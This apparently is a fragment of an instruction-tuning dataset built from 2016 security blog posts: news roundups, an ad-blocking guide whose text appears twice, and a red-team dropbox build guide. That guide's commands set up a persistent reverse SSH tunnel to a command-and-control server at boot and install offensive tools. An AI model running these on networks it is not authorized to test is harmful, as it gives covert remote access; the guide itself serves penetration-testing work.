        "output": "Sierra Ward The other day I went to get some food with a co-worker When the counter boy asked for my name I told him The co-worker said she could tell I wasn't a pentester because after realizing how vulnerable the world is they have a difficult time being open with their personal information on ANY level In an industry that deals on a daily basis with the threat of evil it's easy to become jaded and cynical about the world Perhaps that is part of the draw that John has He bucks the norm and is more open than many people I know and not just in information security He has an impervious ability to be vulnerable and candid and that's appealing maybe ESPECIALLY in an industry like ours That attitude continues to trickle down to the relationships we have with our co-workers and the ways he interacts with us and we interact with each other This is no less true than about how much he's shared publicly about his mother and their family's struggle in the last few months to face her cancer diagnosis Last week I had the privilege to attend one of their kid's birthday parties previously I was a tutor to their children and I got to see Rita As usual she was in brave spirits and though tired was her usual happy laughing self But the latest prognosis is not a good one and while she was able to fight it off for a bit it seems it may be a loosing battle more quickly than hoped Somehow she and I ended up on a bench at the edge of the kitchen together We got to have a candid talk about how she's come to be okay with facing death and saying goodbye to her family I felt a little guilty that I was monopolizing her time but also quite lucky to get to spend a few more moments with her As we age we all come closer and closer to facing the deaths of the people closest to us and it is sobering to see someone who can face it with dignity grace and love Her testimony of peace was deeply moving John came and sat nearby and listened to our conversation He mentioned how surprised he was that so many co-workers have broken down in tears upon hearing about Rita's diagnosis But it doesn't surprise me In a world with so much brokenness and so much bad to meet a kind and loving person seems even more special and rare Rita said I still don't understand what I did Usually it was just emailing people to ask about attachments and receipts and to clarify things And yet it is her kindness in all her small ways her deep care of each of us her love that is so fantastically moving in the face of such cynicism in a dark world Rita has been a pillar of BHIS not just because she's on the accounting team the gears that run any business but also because of her unwavering kindness and good cheer In many ways she is the token mom of BHIS and all of its employees She has shown us that we do not necessarily need to go do great things to change the world we may change it by loving deeply and genuinely in many small ways our sphere of influence spreading even beyond our wildest dreams Rita will leave a deep and lasting legacy not only because she has raised such brilliant and wonderful children who carry on her nature of kindness and love but also because of how she has impacted each of our lives It has been and is an honor to know you Rita"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>The Doctor Will See You Now</title>\n<taxonomies>Author, CJ Cox, InfoSec 101</taxonomies>\n<creation_date>Thu, 28 Jul 2016 17:15:29 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "CJ Cox Joining a new organization is always a little intimidating being amongst a group of crack hackers in a top-notch small company only squares the stress On the bright side even the boss will often say Sometimes I feel like the dumbest person in the room This frequently happens during the review of some magic move a pentester has pulled to reveal a new zero-day finding in a routine test It's both refreshing and reassuring to know I'm not alone and everyone's ego's in check It's exciting to see what a group of amazing people with skills that rival those of great surgeons can achieve but it's also fascinating to work with our customers As the Solutions Engineer John also isn't big on specific titles I spend a lot of time with the customers You're a crack group of people smart on security and wanting to do the right things It like the very best doctor patient relationship a good medical team with a smart and motivated patient and you get some amazing results As the new guy I started last month I found it quite easy to get through a call where the customer was presenting their problem because they knew their environments and they had a good idea of where they were trying to go Perhaps because the customers are so smart and so knowledgeable they often wonder why they can't speak directly to a pentester The short answer is Pentesters are busy slicing it up When one is available I almost always have a ride along The deeper answer is that like the surgeon those specialists are expensive and in high demand As the Solutions Engineer I'm more of a general practitioner my purpose is diagnosing and clarifying the customer's problems I make a quick diagnosis and then start focusing on general solutions If needed we pull in the specialists to verify the prognosis or dig into the depths of the issue I only have five weeks on station at BHIS but I have 20 plus years in IT and security I've done everything from help desk to junior system administrator to campus security manager and systems engineer I understand technology and risk across a broad spectrum and link security problems with business needs I can't dig out a zero-day in javascript but I can get you lined up with the folks who can Joff The high caliber of our customers certainly makes this job fun and rewarding When a customer doesn't know exactly what they need to improve their security health I can guide the discussion to diagnose what services and specialists are going to provide the best result Security triage is my specialty and I look forward to working with the patients customers and creating a healthier business and security environment"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Lawrence's List 072916</title>\n<taxonomies>InfoSec 101, News, Adblockers, Dark Web, LastPass, OnionScan, RPC</taxonomies>\n<creation_date>Fri, 29 Jul 2016 17:25:37 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Lawrence Hoffman So LastPass is one of my favorite applications and it's making me more nervous every day I haven't lost faith yet though it was lots more convenient when I had autofill on LastPass is everywhere this week Also we've got some neat stuff from OnionScanner and one of my favorite subjects Why you should use an ad blocker LastPass has had a couple of interesting bugs filed about it's autofill features in web browser extensions One of these bugs allows for the dumping of credentials to domains based only on an exploitation of the regex that LastPass uses to determine if the user is at a domain for which LastPass has credentials The lesson learned here is please turn off your autofill It may require you to put you master password in a lot but autofill is just dangerous abs.detectify.com 2016 07 27 how-i-made-lastpass-give-me-all-your-passwords The second LastPass bug allows hijacking of a click events and access to RPC This bug is even worse than the first it would have allowed an attacker to run scripts delete files change master passwords etc Thankfully it appears that both of these situations have now been resolved ugs.chromium.org p project-zero issues detail?id 884 A few weeks back some Sarah Jamie Lewis posted a neat article about the infrastructure of the dark web which she'd created using OnionScan and some data visualization tricks Neat stuff it's an interesting read as to what the infrastructure of a privacy network looks like Of course lots of people would like to get to scanning and replicating this effort doing research of their own which Justin over at AutomatingOSINT has now helped us out with Justin has created a nice easy step by step tutorial to setting up your own OnionScanner on Digital Ocean and is promising a part two with detail on creating the graphs If you don't feel like scanning for yourself he's also provided the dataset at the bottom of the first article ascherari.press onionscan-report-june-2016 ww.automatingosint.com blog 2016 07 dark-web-osint-with-python-and-onionscan-part-one Adblockers run on all my systems not just because I hate being advertised to and tracked but also because ads are bad for my computer I remember thinking way back in the early internet days that if I were to decide I must be a villain I'd definitely try to find a way to infect an ad platform and use it as a delivery vector I don't think this was exactly scifi then I was almost certainly not the first person to have this idea but now it's just common knowledge Nowadays I see people scraping adds off the internet to be analyzed and I love the internal monologue I get to have when I see my suspicions confirmed when I see an article about just how many of those ads are in fact distributing malware ww.proofpoint.com us threat-insight post massive-adgholas-malvertising-campaigns-use-steganography-and-file-whitelisting-to-hide-in-plain-sight"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Block Ads on All Your Devices</title>\n<taxonomies>Author, Ethan Robish, General InfoSec Tips & Tricks, InfoSec 201, adblock, malvertising, VPN</taxonomies>\n<creation_date>Mon, 01 Aug 2016 17:22:37 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Ethan Robish Ads serve an important function on the internet For many websites ads are the main form of revenue that funds the site's content or service This however doesn't prevent them from annoying users taking up bandwidth or even being malicious They can completely hijack the page you are viewing with popups and scare tactics You as a savvy security blog reader know better than to click to remove virus or believe that your phone is out of memory and needs fixing But can you say the same for your spouse your children or your parents Nightmare Material Like many of you I use an ad block extension in my browser It's one of the first things I install with a new browser However it's not perfect Each browser on each device needs its own extension which takes up valuable resources and some browsers don't support extensions In a world where people own multiple desktops laptops media devices tablets and phones this quickly becomes unmanageable Home Ad Blocking Solution DNS Server One solution is to prevent contacting ad domains in the first place using DNS In fact Security Weekly covered this exact scenario in a tech segment ww.youtube.com watch?v 79-nOS2zgIY While I can appreciate Paul wanting to set up and manage his own DHCP and DNS servers I wanted a more hands-off approach If you want a super simple solution I recommend signing up for a free OpenDNS account From there you configure which categories you'd like to block change your DNS settings on your home network and you're done ignup.opendns.com homefree But the solution I decided on was mentioned by the guys at Security Weekly in their very next episode The solution is called Pi-Hole ww.youtube.com watch?v T5XTENPitx0 It can be installed on a RaspberryPi and comes with a DNS server pre-configured to block over 100 000 ad-related domains The installation script assumes you're running Debian so you don't necessarily need a RaspberryPi to use it i-hole.net If you're putting this on a fresh RaspberryPi I recommend going with the Raspbian Lite image and following the instructions on Pi-Hole's website ww.raspberrypi.org downloads raspbian Or you can use the one-click installer that comes with the DietPi Linux distro ietpi.com Once installed I switched the DHCP DNS servers on my home router to point to my new Pi-Hole IP address From then on any time a device on my home network gets an IP via DHCP they also get the benefit of ad blocking through the Pi-Hole DNS Through Pi-Hole's web interface you can add custom sites to blacklist or whitelist Consider whitelisting sites you trust and wish to support You may also need to whitelist certain domains if you notice that your devices aren't behaving as expected After I got this running on my home network I felt a sense of accomplishment in that I had protected my laptop my phone and even my wife's devices in one fell swoop It wasn't long however before I left the safety of my home network and ventured out into the world The primary place I noticed was on my phone both browsing the web and opening free ad-based apps We can do better Ad Traffic Hovers at 10-15 Daily Remote Ad Blocking Solution VPN The next part of my solution involved setting up a home VPN that I could connect when away from home While searching I ran across the SoftEther project It's open-source cross-platform and supports numerous protocols I roughly followed this guide to set up and configure the SoftEther server on my Raspberry Pi omearp.blogspot.com 2013 11 setting-up-l2tpipsec-vpn-with-softether.html You'll need to allow the correct ports through your router and have a public IP or domain you can use to connect while you're away from home I took advantage of SoftEther's free dynamic DNS service Your port list may vary based on which VPN protocol s you decided to use For L2TP IPSec I had to forward UDP ports 500 and 4500 along with enabling the IPSec and L2TP passthrough options on my router After that it was a matter of configuring my laptop and phone with the correct client VPN profiles More details can be found on SoftEther's website but if you've ever set up a VPN on your device before this should be straightforward Mobile Devices ww.softether.org 4-docs 2-howto 3.VPN_for_Mobile 1.iPhone_and_Android Mac OSX ww.softether.org 4-docs 2-howto 9.L2TPIPsec_Setup_Guide_for_SoftEther_VPN_Server 5.Mac_OS_X_L2TP_Client_Setup Windows ww.softether.org 4-docs 2-howto 9.L2TPIPsec_Setup_Guide_for_SoftEther_VPN_Server 4.Windows_L2TP_Client_Setup Now when I'm away from home all I have to do is start up my VPN connection Not only is my traffic encrypted but ads are blocked too This also helps cut down on data usage since the ads won't be transferred over the connection Ethan Robish Ads serve an important function on the internet For many websites ads are the main form of revenue that funds the site's content or service This however doesn't prevent them from annoying users taking up bandwidth or even being malicious They can completely hijack the page you are viewing with popups and scare tactics You as a savvy security blog reader know better than to click to remove virus or believe that your phone is out of memory and needs fixing But can you say the same for your spouse your children or your parents Nightmare Material Like many of you I use an ad block extension in my browser It's one of the first things I install with a new browser However it's not perfect Each browser on each device needs it's own extension which takes up valuable resources and some browsers don't support extensions In a world where people own multiple desktops laptops media devices tablets and phones this quickly becomes unmanageable Home Ad Blocking Solution DNS Server One solution is to prevent contacting ad domains in the first place using DNS In fact Security Weekly covered this exact scenario in a tech segment ww.youtube.com watch?v 79-nOS2zgIY While I can appreciate Paul wanting to set up and manage his own DHCP and DNS servers I wanted a more hands-off approach If you want a super simple solution I recommend signing up for a free OpenDNS account From there you configure which categories you'd like to block change your DNS settings on your home network and you're done ignup.opendns.com homefree But the solution I decided on was mentioned by the guys at Security Weekly in their very next episode The solution is called Pi-Hole ww.youtube.com watch?v T5XTENPitx0 It can be installed on a RaspberryPi and comes with a DNS server preconfigured to block over 100 000 ad-related domains The installation script assumes you're running Debian so you don't necessarily need a RaspberryPi to use it i-hole.net embed ww.youtube.com watch?v TzFLJqUeirA embed If you're putting this on a fresh RaspberryPi I recommend going with the Raspbian Lite image and following the instructions on Pi-Hole's website ww.raspberrypi.org downloads raspbian Or you can use the one-click installer that comes with the DietPi linux distro ietpi.com Once installed I switched the DHCP DNS servers on my home router to point to my new Pi-Hole IP address From then on any time a device on my home network gets an IP via DHCP they also get the benefit of ad blocking through the Pi-Hole DNS Through Pi-Hole's web interface you can add custom sites to blacklist or whitelist Consider whitelisting sites you trust and wish to support You may also need to whitelist certain domains if you notice that your devices aren't behaving as expected After I got this running on my home network I felt a sense of accomplishment in that I had protected my laptop my phone and even my wife's devices in one fell swoop It wasn't long however before I left the safety of my home network and ventured out into the world The primary place I noticed was on my phone both browsing the web and opening free ad-based apps We can do better Ad Traffic Hovers at 10-15 Daily Remote Ad Blocking Solution VPN The next part of my solution involved setting up a home VPN that I could connect when away from home While searching I ran across the SoftEther project It's open source cross-platform and supports numerous protocols I roughly followed this guide to set up and configure the SoftEther server on my Raspberry Pi omearp.blogspot.com 2013 11 setting-up-l2tpipsec-vpn-with-softether.html You'll need to allow the correct ports through your router and have an public IP or domain you can use to connect while you're away from home I took advantage of SoftEther's free dynamic DNS service Your port list may vary based on which VPN protocol s you decided to use For L2TP IPSec I had to forward UDP ports 500 and 4500 along with enabling the IPSec and L2TP passthrough options on my router After that it was a matter of configuring my laptop and phone with the correct client VPN profiles More details can be found on SoftEther's website but if you've ever set up a VPN on your device before this should be straightforward Mobile Devices ww.softether.org 4-docs 2-howto 3.VPN_for_Mobile 1.iPhone_and_Android Mac OSX ww.softether.org 4-docs 2-howto 9.L2TPIPsec_Setup_Guide_for_SoftEther_VPN_Server 5.Mac_OS_X_L2TP_Client_Setup Windows ww.softether.org 4-docs 2-howto 9.L2TPIPsec_Setup_Guide_for_SoftEther_VPN_Server 4.Windows_L2TP_Client_Setup Now when I'm away from home all I have to do is start up my VPN connection Not only is my traffic encrypted but ads are blocked too This also helps cut down on data usage since the ads won't be transferred over the connection"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Build Your Own Penetration Testing Drop Box</title>\n<taxonomies>Author, Beau Bullock, Red Team, Red Team Tools, Beau Bullock, build your own, hardware hacking, pen-testing, red teaming</taxonomies>\n<creation_date>Wed, 03 Aug 2016 12:55:08 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Beau Bullock TL DR I compared three single-board computers SBC against each other with a specific goal of finding which one would serve best as a penetration testing dropbox and maintain an overall price of around 110 Spoiler Alert At the time I tested these Hardkernel's ODROID-C2 absolutely destroyed the competition in this space If you want to skip the SBC comparison and jump right to building your own pentest dropbox you can find the instructions below and also here Overview A few weeks ago I was scheduled for an upcoming Red Team exercise for a retail organization In preparation for that assessment I started gathering all the gear I might need to properly infiltrate the organization and gain access to their network Social engineering attacks were explicitly removed from the scope for this engagement This meant I wasn't going to be able to ask any employees to plug in USB devices let me in certain rooms or allow me to check my email on their terminals yes this works Essentially what we're left at that point were physical attacks Could I get access to a terminal left unlocked and perform an HID-based think Rubber Ducky attack If the system wasn't unlocked perhaps a USB-Ethernet adapter like the LAN Turtle could be placed in line with the system to give me a remote shell to work from Even if I could get physical access without any prior knowledge of the network's egress filtering setup was I going to be able to get a shell out of the network So this led me down the path of building a pentest dropbox that I could place on a network could command over a wireless adapter automatically SSH out of a network and just be an all-around pentesting box Some Device Requirements Looking into the available options already out there it is very clear that I could either spend over 1 000 to buy something that did what I needed it to do or try to build one comparable for significantly cheaper So I set some very specific goals of what I wanted this device to do Here they are Device has to be relatively unnoticeable in size could be plugged in under a desk unnoticed Has to be able to be controlled over a wireless interface bonus points if multiple wireless interfaces can be used so wireless management and wireless attacks can happen concurrently Persistent reverse SSH tunnel to a command and control server Fully functional pentesting OS not just a shell to route attacks through Decent storage space 32-64GB Actually be a usable pentesting box that is not sluggish due to hardware restrictions Cost around 110 total to build A Look At the Hardware I bought three of the most popular single-board computers SBC to try to find out which one would be the perfect fit for a pentest dropbox that could accomplish my goals The devices I put to the test are as follows Raspberry Pi 3 Model B BeagleBone Black Hardkernel ODROID-C2 Left to Right The BeagleBone Black Raspberry Pi 3 Model B and the ODROID-C2 Let's take a look at the hardware specifications of these devices first Given the chart above the ODROID-C2 has the others beat in the Processor GPU RAM Ethernet speed and Video categories not to mention the ability to install an eMMC storage module instead of running off of a microSD card The BeagleBone Black BBB has 4GB of onboard flash storage and more I O and peripheral options The Pi 3 does have a built-in Wireless adapter and costs less than the C2 or BBB Even though the scale was already tipping in the direction of the ODROID-C2 I still gave each device equal treatment in terms of testing them out as pentest drop boxes In each case I bought additional items to complete each system I found relatively inexpensive cases for the boards power supplies storage cards and wireless adapters where necessary The BBB and Pi 3 only support the ability to use a microSD card as storage where the ODROID-C2 supports microSD and eMMC So in the case of the ODROID-C2 I actually tested both storage mediums Raspberry Pi 3 with microSD Card and ODROID-C2 with eMMC Module Operating System I'm a fan of Kali Linux I use it on pretty much every pentest I perform Along with the desktop versions of their distribution they also provide images for a number of ARM devices Each of the devices I compared has Kali images available for them here One could definitely substitute a distribution of choice for their own pentest dropbox but I found Kali very easy to install and familiar given my history with it In each case it's as simple as writing the image file to an external storage medium like a microSD or in the case of the ODROID-C2 an eMMC module then attaching it to the device and booting it up Wireless The Raspberry Pi 3 conveniently has a built-in wireless card The problem with it is that it doesn't support monitor mode or packet injection While yes this card can still be used as an access point which satisfies the goal of managing the device over WiFI it is unable to perform any wireless attacks I found this relatively inexpensive 11.99 wireless adapter that does everything I would want it to This adapter has an RT5370 chipset that supports monitor mode and worked perfectly when injecting packets with Aireplay-ng RT5370 Chipset Wireless Adapter Neither the BBB nor the C2 includes wireless chips on the devices themselves so a USB wireless adapter was required for them I used the above adapter along with Hostapd to set up an access point I include a full walkthrough on setting this up at the end I could connect to in order to manage the device without physically being connected to it This adapter works with the Pi 3 as well If you want to perform any wireless attacks with the dropbox and opt for the Pi 3 I recommend this adapter Cases and Overall Look For the BeagleBone Black I bought this black case I noticed that the device was heating up a bit during heavy testing For the other two devices I opted for a case that included a case fan ODROID-C2 Case With Fan The ODROID-C2 actually doesn't have very many options available in terms of cases However the ODROID-C2 is almost an exact replica of the Raspberry Pi 3 in terms of where ports are located on the device So pretty much any Pi 3 case should work for it with one small exception that you will see momentarily For both the Pi 3 and the ODROID-C2 I used this Performance Pro Case This case includes a case fan that is powered by two of the GPIO pins located on the boards There is one problem that comes from using a Raspberry Pi case for an ODROID-C2 the power supply socket is the only thing that doesn't match up perfectly This is a problem that can easily be solved with a drill After drilling the hole in the case the power adapter fits just fine The three devices in their cases Total Hardware Costs I decided to test each device with a 64 GB SanDisk Extreme MicroSDXC UHS-1 card This storage amount was something that I personally wanted to have but if you don't need as much storage you can definitely drop the total price by going with lower storage space I also tested out an eMMC module for the ODROID-C2 I only tested a 32 GB eMMC module due to the cost being so much higher You will see later on in this post that the cost is very much worth it Again the wireless card for the Pi 3 is not completely necessary due to the built-in card but if you want to do any wireless attacks you will need an adapter Field Testing the Drop Boxes After getting each device setup with my initial requirements of what I wanted from a pentest dropbox I performed a few tests to compare how well they actually function as a dropbox I first tested how fast each system could boot up To do this I timed from the moment I hit enter after typing 'reboot in a terminal to the moment when the login screen was displayed I also tested how fast from a reboot I could load the Metasploit console The ODROID-C2 took 1 minute and 14 seconds from reboot to Metasploit console This was a full minute faster than the Raspberry Pi 3 and over 2 minutes faster than the BeagleBone Black Next I baselined password cracking speeds on the devices Granted I don't think I would ever have a need or really want to do any cracking on these I have a decent cracking rig I could always send hashes to This was more a test of the processors in each of them so that I could have a number to visually see which one was operating faster To do this I simply used the baseline test functionality from John the Ripper john --test Again the ODROID-C2 came out on top and by a lot I performed port scans with each device using Nmap against a router I tested both the standard Nmap command without any flags and also with the Service Detection flag -sV There really wasn't a huge difference between the devices during this test They all took around 2 seconds for the basic scan and around 2 minutes and 23 seconds for the Service Detection The last comparison I did between the devices was to see how fast each of them could write data to storage and read data from storage To do this I first used 'dd to write 1 GB of data to disk Then I cleared the Linux cache and read the file again using 'dd I also tested buffered and cached reads using 'hdparm When it comes to disk reads and writes this is where the ODROID-C2 absolutely destroys the competition The ODROID-C2 with the eMMC module is about 15 times faster at writing to disk than the Raspberry Pi 3 with microSD and about 9 times faster at reading data Even the ODROID-C2 with microSD is still about 2 times faster than the Raspberry Pi 3 For testing write speeds I used this sync dd if dev zero of tempfile bs 1M count 1024 sync For testing read speeds I used this sbin sysctl -w vm.drop_caches 3 dd if tempfile of dev null bs 1M count 1024 For testing buffered and cached reads I used this hdparm -Tt dev mmcblk0 Conclusion The ODROID-C2 was a much faster and stable build as a pentest dropbox I ended up taking that device with me on the red team engagement placed it in a location connected to their network and left it up for three days without a hiccup The wireless interface saved me as the network I was plugged into wasn't set up to hand out DHCP addresses to new devices I had to manually discover what the subnet was and manually set an IP address to use to route my traffic If I didn't have the wireless interface the device would have simply been sitting there not able to connect out to my command and control server The ODROID-C2 kept an SSH tunnel to my C2 server up after I set up the interface The device handled multiple Meterpreter sessions perfectly and felt as if I had a very decent penetration testing system on their network The other devices were usable but for about the same price you can build a much more powerful dropbox Below you will find a full walkthrough guide to build an ODROID-C2 pentest dropbox w eMMC yourself But if you read this and already have one of the other devices or just feel like building a dropbox out of one of the other devices I have written up instructions for each You can find PDF's of each write-up here ODROID-C2 w eMMC Pentest DropBox Instructions ODROID-C2 w microSD Pentest DropBox Instructions Raspberry Pi 3 Pentest DropBox Instructions BeagleBone Black Pentest DropBox Instructions Without further ado here is the full walkthrough guide for building the ODROID-C2 Pentest DropBox with an eMMC module ODROID-C2 w eMMC Pentest DropBox Instructions Hardware Shopping List links current as of 8 2 2016 ODroid-C2 41.95 DC 5V 2A 2.5 mm power adapter 6.99 32 GB eMMC module for ODROID-C2 make sure the eMMC to MicroSD adapter is selected as an add-on 1 42.95 MicroSD to USB Adapter 6.99 RT5370 Chipset Wireless Antenna 11.99 Performance Pro Case for RPi 9.99 Initial Setup of the Kali Image Download the Kali ODROID-C2 image from the Kali downloads site here Flash the Kali image to the eMMC For Windows Use an eMMC to microSD adapter then microSD to USB adapter and connect the eMMC to the Windows system On a Windows system unzip the kali -odroidc2.img.xz file with 7zip Use Win32DiskImager to write the Kali image to the eMMC For Linux Use an eMMC to microSD adapter then microSD to USB Adapter and connect the eMMC to the Linux system Use the dd tool to image the Kali file to the eMMC It is very important that you choose the correct storage device here It is very easy to accidentally wipe out your computers hard disk using this command In the example below I use dev sdb but yours may be different so change accordingly xzcat kali -odroidc2.img.xz dd of dev sdb bs 512k Fix eMMC reboot Issue For some reason the uInitrd file in the boot partition gets corrupted after rebooting This is a known issue and is documented here ithub.com offensive-security kali-arm-build-scripts issues 76 The steps below are a workaround that seems to fix this issue for now While eMMC is still plugged into system copy off the boot partition Image meson64_odroidc2.dtb and uInitrd Create a backup folder in the boot partition and copy these files there Image meson64_odroidc2.dtb and uInitrd Insert the eMMC card into the ODROID-C2 and boot it up using the power supply an HDMI cable for display and keyboard mouse plugged into the USB ports Login to the Kali Linux distribution with the username of 'root and the password of 'toor Mount the boot partition and also make it auto mount on start up using etc fstab mount dev mmcblk0p1 boot echo dev mmcblk0p1 boot auto defaults 0 0 etc fstab Create the backup restore script nano boot backup restore.sh Copy the following into boot backup restore.sh bin bash cp boot backup boot Make the script executable and make sure it runs without error chmod 755 boot backup restore.sh boot backup restore.sh Add the script to the rc.local nano etc rc.local Add the following line before 'exit 0 boot backup restore.sh Plug an Ethernet cable into the ODROID-C2 to provide Internet to the device The ODROID-C2 should automatically attempt to obtain an IP address via DHCP Change the root password This can be accomplished by opening up a terminal and typing 'passwd then hitting 'enter Follow the dialog to change the password passwd Expand the filesystem to cover the entire eMMC When the image is flashed to the eMMC it only partitions a portion of the eMMC You must manually recreate the partition using the below fdisk commands to expand the drive Run 'df H before and after to see the difference in the root partition's available space fdisk dev mmcblk0 d The 'd option allows us to delete a partition 2 We select partition 2 to be deleted n The 'n option creates a new partition p 'p creates a primary partition 2 Set partition number 2 Accept default First sector The start sector of the disk Accept default Last sector The end sector of the disk w Use 'w to write the changes reboot reboot then log back in resize2fs dev mmcblk0p2 Use resize2fs to grow the partition Update and upgrade the Kali distribution apt-get update upgrade Setup a WiFi Access Point Install hostapd apt-get install hostapd Create the file etc hostapd hostapd.conf This can be accomplished with the 'nano command nano etc hostapd hostapd.conf Copy the following into the hostapd.conf file Modify the ssid and wpa_passphrase accordingly Interface configuration interface wlan0 ssid tortugas channel 1 WPA configuration macaddr_acl 0 auth_algs 3 ignore_broadcast_ssid 0 wpa 3 wpa_passphrase pirateslife4me wpa_key_mgmt WPA-PSK wpa_pairwise CCMP TKIP rsn_pairwise CCMP Hardware configuration driver nl80211 ieee80211n 1 hw_mode g Modify the file etc init.d hostapd nano etc init.d hostapd Find the line DAEMON_CONF And change it to DAEMON_CONF etc hostapd hostapd.conf Install Dnsmasq apt-get install dnsmasq Edit etc dnsmasq.conf nano etc dnsmasq.conf Add the following to etc dnsmasq.conf This will specify dnsmasq to bind to the wlan0 interface and provide DHCP to clients The range specified below will hand out IP's in the 172.16.66.50-172.16.66.100 range no-resolv Interface to bind to interface wlan0 bind-interfaces Specify starting_range end_range lease_time dhcp-range 172.16.66.50 172.16.66.100 255.255.255.0 12h Edit etc network interfaces nano etc network interfaces Add the following to etc network interfaces This will specify a static IP of 172.16.66.1 for the wlan0 interface auto wlan0 allow-hotplug wlan0 iface wlan0 inet static address 172.16.66.1 netmask 255.255.255.0 At this point plug in the Wireless adapter and attempt to bring up the interface airmon-ng check kill hostapd etc hostapd hostapd.conf If there are no errors you should now be able to connect to the SSID with a wireless device Enable hostapd to start on boot update-rc.d hostapd enable Enable dnsmasq to start on boot I had issues with update-rc.d dnsmasq enable here because dnsmasq was starting before wlan0 was up and failing to bind to the interface Instead I found adding service dnsmasq start to etc rc.local works nano etc rc.local Add the following line to etc rc.local before 'exit 0 service dnsmasq start Setup Automatic Reverse SSH Tunnel This section assumes you have a command and control server accessible on the Internet and that server has SSH enabled on port 22 Install 'autossh to use to automatically create an SSH tunnel to a command and control server apt-get install autossh Generate SSH keys ssh-keygen Leave all of the settings default Copy root .ssh id_rsa.pub to the C2 server scp root .ssh id_rsa.pub root directory to upload to Append the contents of id_rsa.pub to .ssh authorized_keys or create this file on the C2 server On C2 server cat directory to upload to id_rsa.pub .ssh authorized_keys Test the key-based authentication If all goes well you should end up logged into the C2 server without the requirement of entering a password On the ODROID-C2 ssh root Test 'autossh autossh -M 11166 -o PubkeyAuthentication yes -o PasswordAuthentication no -i root .ssh id_rsa -R 6667 localhost 22 root If all goes well an ssh session should be established and port 6667 should now be listening on the C2 server On the C2 server SSH'ing to this port should provide an SSH shell to the ODROID-C2 The -M option 11166 is a monitor port Add the 'autossh command to etc rc.local to establish the SSH tunnel at boot nano etc rc.local Add the following to etc rc.local autossh -M 11166 -N -f -o PubkeyAuthentication yes -o PasswordAuthentication no -i root .ssh id_rsa -R 6667 localhost 22 root Flag meanings -N Do not execute a command on the middleman machine -f drop in the background Execute this command but do not wait for output or an exit code If this is not added your machine might hang at boot Final Touches Some tools are pre-installed on the Kali ARM image but not many sqlmap wireshark nmap hydra john aircrack-ng are installed by default Install whatever tools you want to have on your dropbox Here are some to get you started apt-get install responder metasploit-framework macchanger voiphopper snmpcheck onesixtyone patator isr-evilgrade creddump screen To go into Wireless attack mode instead of using the card as an access point follow these instructions service hostapd stop airmon-ng check kill airmon-ng start wlan0 airodump-ng wlan0mon Or any other wireless attack toolkit Optionally it is possible to connect a second wireless card to use as the attack interface"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Lawrence's List 080516</title>\n<taxonomies>InfoSec 101, News, browser holes, development, Felony, more security, Pwn2Own, Software engineer, trend micro, venmo</taxonomies>\n<creation_date>Fri, 05 Aug 2016 16:38:53 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Lawrence Hoffman With BlackHat and DefCon happening as I type it's hard to choose what's going to make this list I will probably save most of the big shiny new wrap ups for next week after I've had a chance to review some of what those two conventions produced Until there here's a few articles and a project that I found interesting this week As a software engineer it is important to always have in mind what level of authentication is required to perform this action Failure to do so often results in some pretty big problems As we saw with the court case between Apple and the FBI the iPhone has some pretty sophisticated security features Unfortunately it also has some nifty ease of use features By themselves these features are often helpful and not a real security threat of any kind However when combined they sometimes lead to real problems As is the case with Venmo an app that allows users to send and receive money with other Venmo users They implemented a feature to allow notification and authorization via text message due to the fact that iPhone displays text messages on the lock screen and Siri can send texts when the phone is locked bam money can be stolen ww.martinvigo.com steal-2999-99-minute-venmo-siri I like this next article because he just has a solid point Many developers will install local copies of the tools they use to handle their backend data on a their workstation for testing code they're working on locally The fact that many of these tools come either built-in or add-on web interfaces which developers find extremely handy for checking the state of the database during development and therefore often have installed leads to a possible vulnerability when surfing about the web It might be worthwhile to note that the attacks described here rely on HTTP 0.9 and DNS rebinding both of which will be very hard to pull off in Chrome impossible if the browser is the Chrome-nightly build as support for HTTP 0.9 was removed and DNS rebinding was made very difficult if not impossible in a recent bug fix ouk.co blog hacking-developers Following up on March's 